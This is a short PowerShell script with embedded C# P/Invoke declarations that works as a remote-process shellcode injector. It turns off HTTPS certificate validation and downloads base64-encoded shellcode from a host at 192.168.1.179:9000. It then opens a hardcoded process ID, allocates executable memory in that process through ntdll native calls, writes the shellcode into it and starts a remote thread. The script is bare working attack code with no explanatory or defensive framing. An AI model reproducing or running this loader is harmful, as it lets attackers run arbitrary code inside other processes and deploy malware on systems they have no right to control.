$code = @"
using System;
using System.Runtime.InteropServices;
public class S {
    [DllImport("ntdll.dll")] public static extern uint NtAllocateVirtualMemory(IntPtr h, ref IntPtr a, IntPtr z, ref uint s, uint t, uint p);
    [DllImport("ntdll.dll")] public static extern uint NtWriteVirtualMemory(IntPtr h, IntPtr a, byte[] b, uint l, ref uint w);
    [DllImport("ntdll.dll")] public static extern uint NtCreateThreadEx(out IntPtr t, uint d, IntPtr o, IntPtr h, IntPtr s, IntPtr p, bool c, uint z, uint st, uint ms, IntPtr a);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool i, int p);
}
"@
Add-Type -TypeDefinition $code

# Trust self-signed certificate for HTTPS
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$sc = [Convert]::FromBase64String((iwr https://192.168.1.179:9000/shellcode.txt -UseBasicParsing).Content)
$h = [S]::OpenProcess(0x1F0FFF, 0, 15772)
$a = [IntPtr]::Zero
$s = $sc.Length
[S]::NtAllocateVirtualMemory($h, [ref]$a, 0, [ref]$s, 0x3000, 0x40)
$w = 0
[S]::NtWriteVirtualMemory($h, $a, $sc, $sc.Length, [ref]$w)
$t = [IntPtr]::Zero
[S]::NtCreateThreadEx([ref]$t, 0x1FFFFF, 0, $h, $a, 0, 0, 0, 0, 0, 0)
Write-Output "Injected!"
